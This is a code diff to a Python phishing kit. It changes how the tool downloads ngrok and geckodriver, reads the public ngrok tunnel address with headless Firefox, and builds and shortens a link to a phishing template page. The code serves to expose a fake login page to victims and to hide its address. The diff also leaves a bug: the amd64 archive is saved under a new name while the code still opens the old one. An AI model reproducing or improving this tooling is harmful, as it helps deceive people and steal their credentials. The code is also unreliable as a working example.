@@ -1,7 +1,6 @@
 #!/bin/python3 env
 
 from colorama import Fore, Style
-import geckodriver_autoinstaller
 import os
 import os.path
 import pkg_resources
@@ -34,8 +33,6 @@ class Phishing:
 
 		try:
 
-			geckodriver_autoinstaller.install()
-
 			if not os.path.isfile(f'{self.resources}/binaries/ngrok'):
 				if '64' in arch:
 					if 'arm' in arch or 'Android' in arch:
@@ -47,7 +44,7 @@ class Phishing:
 
 						
 					else:
-						urllib.request.urlretrieve('https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip', f'{self.resources}/binaries/ngrok.zip')
+						urllib.request.urlretrieve('https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip', f'{self.resources}/binaries/ngrok-stable-linux-amd64.zip')
 						with zipfile.ZipFile(f'{self.resources}/binaries/ngrok.zip', 'r') as zip_ref:
 							zip_ref.extractall(f'{self.resources}/binaries')
 							os.chmod(f'{self.resources}/binaries/ngrok', 0o777)
@@ -67,6 +64,22 @@ class Phishing:
 							zip_ref.extractall(f'{self.resources}/binaries')
 							os.chmod(f'{self.resources}/binaries/ngrok', 0o777)
 							os.remove(f'{self.resources}/binaries/ngrok-stable-linux-386.zip')
+
+			elif not os.path.isfile(f'{self.resources}/binaries/geckodriver'):
+				if '64' in arch:
+					urllib.request.urlretrieve('https://github.com/mozilla/geckodriver/releases/download/v0.28.0/geckodriver-v0.28.0-linux64.tar.gz', f'{self.resources}/binaries/geckodriver-v0.28.0-linux64.tar.gz')
+					with tarfile.open(f'{self.resources}/binaries/geckodriver-v0.28.0-linux64.tar.gz') as tar_ref:
+						tar_ref.extractall(f'{self.resources}/binaries')
+						os.chmod(f'{self.resources}/binaries/geckodriver', 0o777)
+						os.remove(f'{self.resources}/binaries/geckodriver-v0.28.0-linux64.tar.gz')
+				else:
+					urllib.request.urlretrieve('https://github.com/mozilla/geckodriver/releases/download/v0.28.0/geckodriver-v0.28.0-linux32.tar.gz', f'{self.resources}/binaries/geckodriver-v0.28.0-linux32.tar.gz')
+					with tarfile.open(f'{self.resources}/binaries/geckodriver-v0.28.0-linux32.tar.gz') as tar_ref:
+						tar_ref.extractall(f'{self.resources}/binaries')
+						os.chmod(f'{self.resources}/binaries/geckodriver', 0o777)
+						os.remove(f'{self.resources}/binaries/geckodriver-v0.28.0-linux32.tar.gz')
+
+
 		except Exception as error:
 			print(f"\n{Fore.RED}[ Error ]{Fore.YELLOW} {error}")
 			sys.exit()
@@ -153,9 +166,9 @@ class Phishing:
 	def get_link(self):
 		options = Options()
 		options.add_argument('-headless')
-		driver = webdriver.Firefox(options=options, service_log_path=f'{self.resources}/logs/geckodriver.log')
+		driver = webdriver.Firefox(options=options, executable_path=f'{self.resources}/binaries/geckodriver', service_log_path=f'{self.resources}/logs/geckodriver.log')
 		wait = WebDriverWait(driver, timeout=10)
-		driver.get("http://www.localhost:4040/status")
+		driver.get("http://localhost:4040/status")
 		ngrok_link = wait.until(expected.visibility_of_element_located((By.XPATH, '/html/body/div[2]/div/div/div/div[1]/div[1]/ul/li[1]/div/table/tbody/tr[1]/td'))).text
 		long_link = f"{ngrok_link}/{self.template}"
 		shortener = pyshorteners.Shortener()
